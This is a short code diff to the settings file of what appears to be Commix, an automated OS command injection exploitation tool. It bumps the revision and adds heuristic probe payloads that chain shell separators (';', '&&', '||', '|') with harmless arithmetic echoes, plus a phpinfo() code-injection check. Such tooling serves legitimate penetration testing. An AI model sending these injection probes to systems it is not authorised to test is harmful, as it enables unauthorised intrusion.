@@ -225,7 +225,7 @@ DESCRIPTION_FULL = "Automated All-in-One OS Command Injection Exploitation Tool"
 DESCRIPTION = "The command injection exploiter"
 AUTHOR  = "Anastasios Stasinopoulos"
 VERSION_NUM = "3.5"
-REVISION = "8"
+REVISION = "9"
 STABLE_RELEASE = False
 if STABLE_RELEASE:
   VERSION = "v" + VERSION_NUM + "-stable"
@@ -263,6 +263,16 @@ PROXY_REGEX = r"((http[^:]*)://)?([\w\-.]+):(\d+)"
 INJECT_TAG = "INJECT_HERE"
 INJECT_TAG_REGEX = r"(?i)INJECT[_]?HERE"
 VALUE_BOUNDARIES = r'[\\/](.+?)[\\/]'
+
+#Basic heuristic checks for command injections
+RAND_A = random.randint(1,10000)
+RAND_B = random.randint(1,10000)
+BASIC_STRING = str(RAND_A) + "+" + str(RAND_B)
+BASIC_COMMAND_INJECTION_PAYLOADS = [_urllib.parse.quote_plus(";echo $((" + BASIC_STRING + "))&&echo $((" + BASIC_STRING + "))||echo $((" + BASIC_STRING + "))"),
+                                   _urllib.parse.quote_plus("|set /a (" + BASIC_STRING + ")&set /a (" + BASIC_STRING + ")")
+                                   ]
+BASIC_COMMAND_INJECTION_RESULT = str(RAND_A + RAND_B)
+IDENTIFIED_COMMAND_INJECTION = False
 
 #Basic heuristic checks for code injection warnings or... phpinfo page ;)
 PHPINFO_PAYLOAD = "phpinfo()"
